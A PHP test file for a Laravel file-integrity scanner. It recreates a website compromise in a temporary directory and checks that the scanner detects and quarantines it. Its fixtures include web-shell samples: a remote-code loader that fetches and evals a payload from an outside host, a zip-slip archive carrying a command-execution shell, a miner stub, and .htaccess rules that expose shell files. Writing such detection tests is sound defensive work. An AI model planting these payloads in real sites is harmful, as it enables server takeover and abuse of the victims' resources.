<?php

namespace Claire\Sentinel\Tests;

use Claire\Sentinel\Scanner\IntegrityScanner;
use Illuminate\Support\Facades\File;
use Tests\TestCase;
use ZipArchive;

/**
 * Runs the scanner against a throw-away directory that mimics the 2026 compromise.
 */
class ScannerTest extends TestCase
{
    private string $root;

    protected function setUp(): void
    {
        parent::setUp();
        $this->root = sys_get_temp_dir() . '/sentinel-test-' . bin2hex(random_bytes(4));
        $this->plant('public/index.php', "<?php\nrequire __DIR__.'/../vendor/autoload.php';\n");
        $this->plant('app/Http/Controllers/HomeController.php', "<?php\nclass HomeController {}\n");
        $this->plant('.htaccess', "RewriteEngine On\n");

        config([
            'sentinel.alert_email' => null,
            'sentinel.integrity.baseline_path' => $this->root . '/storage/app/sentinel/baseline.json',
            'sentinel.integrity.quarantine_path' => $this->root . '/storage/app/sentinel/quarantine',
            'sentinel.integrity.watch' => ['app', 'public/index.php', '.htaccess', 'public/uploads/.htaccess'],
            'sentinel.integrity.scan' => ['.'],
        ]);
    }

    protected function tearDown(): void
    {
        File::deleteDirectory($this->root);
        parent::tearDown();
    }

    private function plant(string $rel, string $content): void
    {
        File::ensureDirectoryExists(dirname("{$this->root}/{$rel}"));
        file_put_contents("{$this->root}/{$rel}", $content);
    }

    private function scanner(): IntegrityScanner
    {
        return new IntegrityScanner($this->root);
    }

    private function types(array $findings): array
    {
        $out = [];
        foreach ($findings as $f) {
            $out[$f['path']][] = $f['type'];
        }
        return $out;
    }

    public function test_clean_tree_with_baseline_has_no_findings(): void
    {
        $s = $this->scanner();
        $s->restoreGuards();
        $s->writeBaseline($s->buildBaseline());
        $this->assertSame([], $s->scan());
    }

    public function test_detects_the_2026_attack_and_fix_is_safe(): void
    {
        $s = $this->scanner();
        $s->restoreGuards();
        $s->writeBaseline($s->buildBaseline());

        // Replay what the attacker did
        $this->plant('public/index.php', "<?php \$cron = ['zi','p:/','/wp-cron.zip#wp-cron'];include implode('',\$cron);?><?php\nrequire 'x';\n");
        $this->plant('public/uploads/all/product/22.php74', "<?php echo 'shell';");
        $this->plant('public/uploads/product/.htaccess', "<FilesMatch \"^(22.php|cyb01.php)$\">\n Order allow,deny\n Allow from all\n</FilesMatch>\n");
        $this->plant('cgi-bin/src/index.php', "\xFF\xD8\xFF\xE0JFIF<?=\n\$u='https://rohdempresarial.com/c.txt'; eval(\"?>\" . file_get_contents(\$u));");
        $this->plant('routes/Unit/.htaccess', "<FilesMatch '.(py|exe|phtml|php)$'>\nOrder allow,deny\nDeny from all\n</FilesMatch>\n<FilesMatch '^(index.php)$'>\nOrder allow,deny\nAllow from all\n</FilesMatch>");
        $this->plant('config/.lib/xmrig', "\x7fELF\x02\x01\x01" . str_repeat("\0", 64));
        $this->plant('app/Http/Controllers/HomeController.php', "<?php\nclass HomeController { function import_data() {} }\n");
        $zip = new ZipArchive();
        File::ensureDirectoryExists("{$this->root}/public/uploads");
        $zip->open("{$this->root}/public/uploads/evil.zip", ZipArchive::CREATE);
        $zip->addFromString('../scheduler-run.php', '<?php system($_REQUEST["c"]);');
        $zip->close();
        unlink("{$this->root}/public/uploads/.htaccess");

        $found = $this->types($s->scan());

        $this->assertContains('modified', $found['public/index.php']);
        $this->assertContains('signature', $found['public/index.php']);
        $this->assertContains('public-script', $found['public/uploads/all/product/22.php74']);
        $this->assertContains('htaccess', $found['public/uploads/product/.htaccess']);
        $this->assertContains('signature', $found['cgi-bin/src/index.php']);
        $this->assertContains('htaccess', $found['routes/Unit/.htaccess']);
        $this->assertContains('binary', $found['config/.lib/xmrig']);
        $this->assertContains('hidden-dir', $found['config/.lib']);
        $this->assertContains('archive', $found['public/uploads/evil.zip']);
        $this->assertContains('modified', $found['app/Http/Controllers/HomeController.php']);
        $this->assertContains('guard', $found['public/uploads/.htaccess']);

        // Same steps as `sentinel:scan --fix`, against the temp root (the command itself targets base_path()).
        $s->restoreGuards();
        $stamp = 'test';
        foreach ($s->scan() as $f) {
            if ($f['quarantinable']) {
                $s->quarantine($f['path'], $stamp);
            }
        }

        foreach (['public/uploads/all/product/22.php74', 'public/uploads/product/.htaccess', 'cgi-bin/src/index.php', 'routes/Unit/.htaccess', 'config/.lib/xmrig', 'public/uploads/evil.zip'] as $gone) {
            $this->assertFileDoesNotExist("{$this->root}/{$gone}");
            $this->assertFileExists("{$this->root}/storage/app/sentinel/quarantine/{$stamp}/{$gone}");
        }
        // Known files are never moved: removing the front controller would take the site down.
        $this->assertFileExists("{$this->root}/public/index.php");
        $this->assertFileExists("{$this->root}/app/Http/Controllers/HomeController.php");
        $this->assertFileExists("{$this->root}/public/uploads/.htaccess");
        $this->assertStringContainsString('Require all denied', file_get_contents("{$this->root}/public/uploads/.htaccess"));
    }

    public function test_tampered_baseline_is_reported(): void
    {
        $s = $this->scanner();
        $s->restoreGuards();
        $path = $s->writeBaseline($s->buildBaseline());
        $data = json_decode(file_get_contents($path), true);
        $data['files']['public/index.php'] = str_repeat('0', 64);
        file_put_contents($path, json_encode($data));

        $baseline = array_values(array_filter($s->scan(), fn ($f) => $f['type'] === 'baseline'));
        $this->assertSame('critical', $baseline[0]['severity']);
        $this->assertStringContainsString('signature mismatch', $baseline[0]['detail']);
    }
}
